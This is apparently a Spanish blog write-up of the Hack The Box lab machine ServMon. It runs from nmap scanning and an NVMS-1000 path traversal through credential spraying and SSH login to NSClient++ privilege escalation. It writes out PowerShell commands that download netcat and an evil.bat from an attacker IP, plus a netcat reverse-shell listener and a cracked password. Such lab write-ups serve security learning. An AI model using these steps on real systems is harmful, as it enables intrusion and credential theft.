---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | ServMon            |
| Os                     | Windows            |
| Difficulty             | Easy               |
| Points                 | 0                  |
| IP                     | 10.10.10.184       |

## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/ServMon/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.184
```

![nmap 1](/assets/images/ServMon/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.184 -oG allPorts
```

![nmap2](/assets/images/ServMon/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p21,22,80,135,139,445,5666,6063,6699,49664,49665,49666,49667,49668,49670 10.10.10.184 -oN targeted
```

![nmap 3.1](/assets/images/ServMon/nmap3.1.png)

En esta parte vemos en ftp el usuario Anonymus habilidato

![nmap 3.2](/assets/images/ServMon/nmap3.2.png)

![nmap 3.3](/assets/images/ServMon/nmap3.3.png)

Lo primero que podemos hacer es listar las tecnologias que existen en el navegador con whatweb.

![whatweb](/assets/images/ServMon/whatweb.png)

Lo segundo, como tenemos el usuario Anonymus en el servicio ftp, acceder a el y buscar usuarios. Encontramos a Nadine y Nathan. Dentro encontramos 2 archivos de texto que nos descargaremos.

![Confidencial](/assets/images/ServMon/confidential.png)

La contrasena de Nathan esta en su escritorio, la ha cambiado pero puede seguir activa en otro servicio.

![Notas](/assets/images/ServMon/notes.png)

Nathan no ha cargado las contrasenas, no ha removido el acceso publico a las NVMS que es el servicio web del puerto 80 y hay unos archivos confidenciales en sharepoint que podria ser el smb.

En la busqueda de mas informacion, buscamos que otras direcciones usan el NVMS-1000 con <a href="shodan.io">shodan</a>.

Ahora, con searchsploit vemos que existe un exploit para el NVMS 1000, para verlo mas a detalle usaremos:

```s
searchsploit -x Path
```

Vemos que el exploit lo que hace es listar los directorios con Path transversal /../../../, usaremos burpsuite para poder repetir rapidamente el response

![Burpsuite test](/assets/images/ServMon/burp1.png)

![/etc/hosts](/assets/images/ServMon/etc_hosts.png)

Ahora podemos ver las contrasenas que le dejaron a Nathan y procedemos a guardarlas en un credentials.txt.

![Passwords](/assets/images/ServMon/passwords_nathan.png)

A este punto, podemos usar smb para ver que contrasena es usable con el siguiente comando:

```s
crackmapexec smb 10.10.10.184 -u users -p credentials --continue-on-success
```

Una de las contrasenas hizo match con Nadine.

![Password matched](/assets/images/ServMon/password_matched.png)

El siguiente test que podemos hacer es con smbmap, para tratar de listar servicios compartidos, identificandonos con Nadine ahora:

```s
smbmap -H 10.10.10.184 -u 'Nadine' -p 'L1k3B1gBut7s@W0rk'
```

No nos es util el directorio al que tenemos acceso, asi que continuaremos enumerando posibles accesos.

![smbmap](/assets/images/ServMon/smbmap.png)

Podemos intentar tambien usar esta contrasena para acceder al servicio de ssh con:

```s
sshpass -p 'L1k3B1gBut7s@W0rk' ssh Nadine@10.10.10.184
```

![Nadine ssh](/assets/images/ServMon/nadine_ssh.png)

Y ahora podemos acceder a la flag sin problemas, con el comando type la leemos.

## [](#header-2)Escalamiento de privilegios

Para listar nuestros privilegios, podemos usar un:

```s
whoami /priv
net user nadine
```

Ingresamos al servicio NSClient++, el cual tiene exploit en searchsploit con remote execution. Y privilage escalation. 
Con el paso 1, hemos obtenido la contrasena de administrador del servicio.

![nc++ pass](/assets/images/ServMon/nc%2B%2B.png)

Para hacer un port forwarding y poder acceder al servicio, haremos un:

```s
sshpass -p 'L1k3B1gBut7s@W0rk' ssh Nadine@10.10.10.184 -L 8443:127.0.0.1:8443
```

De acuerdo a los pasos, lo siguiente es loggearnos y activar los modulos, que ya estaban activos
- CheckExternalScripts
- Scheduler

Despues nos crearemos un evil.bat y descargaremos<a href="https://eternallybored.org/misc/netcat/">netcat</a> para Windows

Ibamos a enviarnos el archivo mediante impack, pero aun no lo domino, asi que usare powershell para descargarme los archivos. En esta parte presente problemas con el netcat, supongo por que la funcion de powershell es un poco intrusiva. Con el wget el netcat se quedo en la maquina sin borrarse y pude continuar con todo.

```powershell
powershell invoke-WebRequest -UseBasicParsing 10.10.14.29/nc64.exe -OutFile nc.exe
powershell wget http://10.10.14.29/nc64.exe -outfile nc.exe

powershell invoke-WebRequest -UseBasicParsing 10.10.14.29/evil.bat -OutFile evil.bat
powershell wget http://10.10.14.29/evil.bat -outfile evil.bat
```

Nos vamos a poner en escucha en 

```s
sudo nc -nlvvp 443
```

Y nos vamos a settings>external script>script, seleccionamos el botton +Add new y ponemos lo siguiente:

![Command](/assets/images/ServMon/command.png)

Despues nos vamos a Queries y ejecutamos el comando que hemos agregado, aqui mismo visualizaremos los errores por si el .bat contiene alguno y poder darnos una idea mas clara de cual es el problema.

![Run](/assets/images/ServMon/run.png)

![Root](/assets/images/ServMon/root.png)

![Powned](/assets/images/ServMon/powned.png)